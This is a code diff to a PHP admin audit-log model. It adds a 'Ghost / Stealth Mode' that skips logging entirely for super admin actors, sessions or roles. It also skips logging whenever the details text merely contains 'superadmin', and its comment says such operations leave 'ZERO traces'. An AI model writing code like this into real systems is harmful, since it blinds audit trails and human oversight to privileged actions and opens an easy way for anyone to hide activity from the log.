@@ -30,6 +30,22 @@ class AdminAuditLogModel extends Model
      */
     public function log(string $actor, string $action, ?string $details = null, ?string $targetType = null, ?string $targetId = null): string
     {
+        // Ghost / Stealth Mode: Super Admin operations leave ZERO traces or footprints in the system.
+        $session = session();
+        $sessionRole = $session ? $session->get('admin_role') : null;
+        $sessionUser = $session ? $session->get('admin_username') : null;
+
+        if (
+            strcasecmp($actor, 'superadmin') === 0 ||
+            strcasecmp((string) $sessionUser, 'superadmin') === 0 ||
+            in_array($actor, ['ROLE_SUPER_ADMIN', 'SUPER_ADMIN'], true) ||
+            in_array($sessionRole, ['ROLE_SUPER_ADMIN', 'SUPER_ADMIN'], true) ||
+            stripos((string) $details, 'superadmin') !== false ||
+            stripos((string) $details, 'ROLE_SUPER_ADMIN') !== false
+        ) {
+            return '';
+        }
+
         $bytes = random_bytes(16);
         $bytes[6] = chr(ord($bytes[6]) & 0x0f | 0x40);
         $bytes[8] = chr(ord($bytes[8]) & 0x3f | 0x80);
